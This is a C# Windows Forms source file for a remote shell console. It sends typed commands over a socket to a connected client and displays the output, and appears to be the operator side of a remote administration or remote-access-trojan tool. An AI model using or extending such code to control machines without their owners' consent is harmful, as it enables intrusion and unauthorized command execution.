using System;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class SHELL : MetroFramework.Forms.MetroForm
    {
        public string ID = default;
        private Socket _socket = default;
        public SHELL(Socket client, string ident)
        {
            InitializeComponent();
            textBox1.ScrollBars = ScrollBars.Vertical;
            _socket = client;
            ID = ident;
        }
        int count = 0;
        public void bilgileriIsle(string received)
        {
            textBox1.Invoke((MethodInvoker)delegate
            {
                textBox1.Text += received.Replace("[NEW_LINE]", Environment.NewLine) + Environment.NewLine + "SHELL>>";
            });
            textBox1.SelectionStart = textBox1.TextLength;
            textBox1.ScrollToCaret();
            count = textBox1.Text.Length;
        }
        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                try
                {
                    textBox1.Text += Environment.NewLine;
                    textBox1.SelectionStart = textBox1.TextLength;
                    textBox1.ScrollToCaret();
                    count = textBox1.Text.Length;
                    byte[] command = Form1.MyDataPacker("SHELL", Encoding.UTF8.GetBytes(textBox1.Text.Substring(textBox1.Text.LastIndexOf("SHELL>>") + "SHELL>>".Length)));
                    _socket.Send(command, 0, command.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (textBox1.Text.Length < count)
            {
                try
                {
                    if (textBox1.Text[textBox1.Text.Length - 1].ToString() == ">")
                    {
                        textBox1.Text += ">";
                        textBox1.Text = textBox1.Text.Replace(">>>", ">>");
                        textBox1.SelectionStart = textBox1.TextLength;
                        textBox1.ScrollToCaret();
                        count = textBox1.Text.Length;
                    }
                }
                catch (Exception) { }
            }
        }
    }
}
